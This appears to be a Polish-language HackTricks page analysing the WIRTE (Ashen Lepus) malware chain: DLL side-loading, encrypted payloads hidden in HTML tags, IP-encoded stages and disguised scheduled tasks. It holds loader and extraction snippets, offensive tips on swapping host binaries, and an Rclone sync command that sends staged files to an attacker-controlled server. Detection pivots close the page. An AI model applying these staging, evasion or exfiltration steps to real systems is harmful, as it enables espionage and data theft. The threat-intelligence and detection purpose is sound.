# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd technik

Ashen Lepus (aka WIRTE) uzbroił powtarzalny wzorzec, który łączy DLL sideloading, staged HTML payloads i modularne .NET backdoors, aby utrzymać się w sieciach dyplomatycznych Bliskiego Wschodu. Technika jest możliwa do ponownego użycia przez dowolnego operatora, ponieważ opiera się na:

- **Archive-based social engineering**: pozornie nieszkodliwe PDF-y instruują cele, aby pobrały archiwum RAR z serwisu do udostępniania plików. Archiwum zawiera wyglądający na prawdziwy EXE przeglądarki dokumentów, złośliwy DLL nazwany po zaufanej bibliotece (np. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) oraz przynętowy `Document.pdf`.
- **DLL search order abuse**: ofiara dwukrotnie klika EXE, Windows rozwiązuje import DLL z bieżącego katalogu, a złośliwy loader (AshenLoader) wykonuje się wewnątrz zaufanego procesu, podczas gdy przynętowy PDF otwiera się, aby nie wzbudzać podejrzeń.
- **Living-off-the-land staging**: każdy późniejszy etap (AshenStager → AshenOrchestrator → modules) pozostaje poza dyskiem do momentu, gdy jest potrzebny, dostarczany jako zaszyfrowane bloby ukryte w pozornie nieszkodliwych odpowiedziach HTML.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loaduje AshenLoader, który wykonuje host recon, szyfruje go AES-CTR i POST-uje go w obracających się parametrach, takich jak `token=`, `id=`, `q=` lub `auth=`, do ścieżek wyglądających jak API (np. `/api/v2/account`).
2. **HTML extraction**: C2 zdradza kolejny etap tylko wtedy, gdy klientowy IP geolokuje się do docelowego regionu, a `User-Agent` pasuje do implantu, co utrudnia sandboxes. Gdy testy przejdą, body HTTP zawiera blob `<headerp>...</headerp>` z zaszyfrowanym Base64/AES-CTR payloadem AshenStager.
3. **Second sideload**: AshenStager jest wdrażany wraz z innym legalnym binarkiem, który importuje `wtsapi32.dll`. Złośliwa kopia wstrzyknięta do binarki pobiera więcej HTML, tym razem wycinając `<article>...</article>`, aby odzyskać AshenOrchestrator.
4. **AshenOrchestrator**: modularny .NET controller, który dekoduje Base64 JSON config. Pola configu `tg` i `au` są łączone/haskowane w klucz AES, który deszyfruje `xrk`. Wynikowe bajty działają jako XOR key dla każdego blobu modułu pobieranego później.
5. **Module delivery**: każdy moduł jest opisywany przez HTML comments, które przekierowują parser do dowolnego taga, łamiąc statyczne reguły, które patrzą tylko na `<headerp>` lub `<article>`. Moduły obejmują persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) oraz file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Nawet jeśli obrońcy blokują lub usuwają określony element, operator musi tylko zmienić tag zasugerowany w komentarzu HTML, aby wznowić dostarczanie.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralele obejścia HTML Staging

Najnowsze badania nad HTML smuggling (Talos) pokazują payloady ukryte jako ciągi Base64 wewnątrz bloków `<script>` w załącznikach HTML i dekodowane przez JavaScript w czasie wykonania. Ten sam trik można ponownie wykorzystać dla odpowiedzi C2: stage zaszyfrowane blob-y wewnątrz tagu script (lub innego elementu DOM) i dekodować je w pamięci przed AES/XOR, dzięki czemu strona wygląda jak zwykły HTML. Talos pokazuje też warstwową obfuskację (zmiana nazw identyfikatorów plus Base64/Caesar/AES) wewnątrz tagów script, co dobrze mapuje się na HTML-staged blob-y C2. Późniejszy writeup Talos o **hidden text salting** jest tu również istotny: rozdzielenie Base64 nieistotnymi komentarzami HTML lub białymi znakami wystarcza, aby zepsuć proste ekstraktory regex, a jednocześnie zachować banalną rekonstrukcję po stronie przeglądarki.

## Recent Variant Notes (2024-2025)

- Check Point zaobserwował kampanie WIRTE w 2024 roku, które nadal opierały się na sideloading z archiwów, ale używały `propsys.dll` (stagerx64) jako pierwszego etapu. Stager dekoduje następny payload za pomocą Base64 + XOR (klucz `53`), wysyła żądania HTTP z hardcoded `User-Agent` i wyodrębnia zaszyfrowane blob-y osadzone między tagami HTML. W jednej gałęzi stage był rekonstruowany z długiej listy osadzonych stringów IP dekodowanych przez `RtlIpv4StringToAddressA`, a następnie łączonych w bajty payloadu.
- OWN-CERT udokumentował wcześniejsze narzędzia WIRTE, gdzie side-loaded `wtsapi32.dll` dropper zabezpieczał stringi za pomocą Base64 + TEA i używał samej nazwy DLL jako klucza deszyfrującego, a następnie obfuskował dane identyfikacyjne hosta przez XOR/Base64 przed wysłaniem ich do C2.

## Rekonstrukcja etapów zakodowanych jako IP

Gałąź `propsys.dll` WIRTE z 2024 roku pokazuje, że następny PE nie musi istnieć jako jeden ciągły blob HTML. Loader może przechowywać bajty stage jako stringi w formacie dotted-quad i odbudowywać je przez `RtlIpv4StringToAddressA`, co jest wzorcem blisko związanym z taktyką Hive **IPfuscation**. Operacyjnie jest to przydatne, gdy aktor chce, aby strona HTML zawierała coś, co wygląda jak nieszkodliwe IOCs lub dane konfiguracyjne, zamiast oczywistego payloadu Base64.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Jeśli odzyskane bajty zaczynają się od `MZ`, prawdopodobnie odtworzyłeś bezpośrednio następny PE. Jeśli nie, sprawdź, czy nie ma wiodącej warstwy XOR/Base64 albo małych fragmentów rozdzielających między adresami.

## Zamienne nazwy DLL i rotacja hostów

Silną cechą tego wzorca jest to, że **back-end stage’ujący HTML/AES/XOR może pozostać identyczny, podczas gdy zmienia się tylko para sideloadingowa**. WIRTE rotowało między `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` i `propsys.dll` w różnych kampaniach, co jest użyteczne, ponieważ:

- `propsys.dll` i `wtsapi32.dll` to niepozorne nazwy DLL Windows, których obecności obrońcy spodziewają się w `%System32%` / `%SysWOW64%`.
- Publiczne katalogi, takie jak **HijackLibs**, już mapują wiele binarek, które załadują te nazwy DLL z katalogu skopiowanej aplikacji, dając operatorom hosty zastępcze bez przeprojektowywania stagera.
- Trzeba dostosować tylko powierzchnię eksportów dla danego hosta. Parser HTML, rutyny AES/XOR i loader modułu zwykle można przenieść bez zmian do forwardującej proxy DLL.

Dla ofensywnych ćwiczeń laboratoryjnych oznacza to, że możesz podzielić problem na **(1) znalezienie stabilnego podpisanego hosta, który lokalnie rozwiązuje wybraną nazwę DLL** oraz **(2) ponowne użycie tej samej logiki ładowania staged HTML za tą DLL**.

## Utwardzanie Crypto i C2

- **AES-CTR wszędzie**: obecne loadery osadzają 256-bitowe klucze oraz nonce (np. `{9a 20 51 98 ...}`) i opcjonalnie dodają warstwę XOR używając ciągów takich jak `msasn1.dll` przed/po deszyfrowaniu.
- **Wariacje materiału klucza**: wcześniejsze loadery używały Base64 + TEA do ochrony osadzonych stringów, a klucz deszyfrujący był wyprowadzany z nazwy złośliwej DLL (np. `wtsapi32.dll`).
- **Podział infrastruktury + kamuflaż subdomenami**: serwery stage’ujące są rozdzielone per narzędzie, hostowane w różnych ASN-ach i czasem wystawiane przez wyglądające na legalne subdomeny, więc spalenie jednego stage nie ujawnia reszty.
- **Przemycanie rekonesansu**: zbierane dane obejmują teraz listy Program Files, aby wykrywać aplikacje o wysokiej wartości, i zawsze są szyfrowane przed opuszczeniem hosta.
- **Rotacja URI**: parametry zapytań i ścieżki REST rotują między kampaniami (`/api/v1/account?token=` → `/api/v2/account?auth=`), unieważniając kruche detekcje.
- **Przypinanie User-Agent + bezpieczne przekierowania**: infrastruktura C2 odpowiada tylko na dokładne ciągi UA, a w przeciwnym razie przekierowuje na nieszkodliwe strony news/health, aby wtopić się w ruch.
- **Dostawa z bramkowaniem**: serwery są geo-fenced i odpowiadają tylko prawdziwym implantom. Nieautoryzowane klienty otrzymują niewzbudzający podejrzeń HTML.

## Trwałość i pętla wykonania

AshenStager upuszcza zaplanowane zadania, które podszywają się pod zadania konserwacyjne Windows i wykonują się przez `svchost.exe`, np.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Te zadania uruchamiają ponownie łańcuch sideloadingu przy starcie lub cyklicznie, zapewniając, że AshenOrchestrator może żądać świeżych modułów bez ponownego dotykania dysku.

## Używanie benign sync klientów do exfiltration

Operatorzy stage’ują dokumenty dyplomatyczne w `C:\Users\Public` (dostępne publicznie i niewzbudzające podejrzeń) przez dedykowany moduł, a następnie pobierają legalny binarny [Rclone](https://rclone.org/), aby zsynchronizować ten katalog ze storage atakującego. Unit42 zauważa, że to pierwszy raz, gdy ten aktor został zaobserwowany podczas użycia Rclone do exfiltration, co wpisuje się w szerszy trend nadużywania legalnych narzędzi synchronizacji, aby zlewać się z normalnym ruchem:

1. **Stage**: skopiuj/zbierz pliki docelowe do `C:\Users\Public\{campaign}\`.
2. **Configure**: dostarcz konfigurację Rclone wskazującą na endpoint HTTPS kontrolowany przez atakującego (np. `api.technology-system[.]com`).
3. **Sync**: uruchom `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, aby ruch przypominał zwykłe backupy w chmurze.

Ponieważ Rclone jest szeroko używany w legalnych workflow backupu, obrońcy muszą skupiać się na anomaliach wykonania (nowe binarki, dziwne remotes lub nagła synchronizacja z `C:\Users\Public`).

## Pivots detekcyjne

- Alarmuj na **podpisane procesy**, które niespodziewanie ładują DLL z lokalizacji zapisywalnych przez użytkownika (filtry Procmon + `Get-ProcessMitigation -Module`), szczególnie gdy nazwy DLL pokrywają się z `netutils`, `srvcli`, `dwampi`, `wtsapi32` lub `propsys`.
- Sprawdzaj podejrzane odpowiedzi HTTPS pod kątem **dużych blobów Base64 osadzonych w nietypowych tagach** lub chronionych przez komentarze `<!-- TAG: <xyz> -->`.
- Najpierw normalizuj HTML: **usuń komentarze i zredukuj białe znaki przed ekstrakcją Base64**, ponieważ techniki ukrywania tekstu mogą rozdzielać payload między granice komentarzy.
- Rozszerz hunting HTML na **ciągi Base64 wewnątrz bloków `<script>`** (stage’owanie w stylu HTML smuggling), które są dekodowane przez JavaScript przed przetwarzaniem AES/XOR.
- Szukaj powtarzających się wywołań **`RtlIpv4StringToAddressA` po których następuje składanie bufora**, szczególnie gdy otaczające stringi to długie listy IPv4, a nie rzeczywiste cele sieciowe.
- Szukaj **zaplanowanych zadań**, które uruchamiają `svchost.exe` z argumentami niebędącymi usługą albo wskazują z powrotem na katalogi droppera.
- Śledź **przekierowania C2**, które zwracają payload tylko dla dokładnych stringów `User-Agent`, a w innych przypadkach odbijają na legalne domeny news/health.
- Monitoruj binaria **Rclone** pojawiające się poza lokalizacjami zarządzanymi przez IT, nowe pliki `rclone.conf` lub zadania synchronizacji pobierające z katalogów stage’ujących, takich jak `C:\Users\Public`.

## Referencje

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
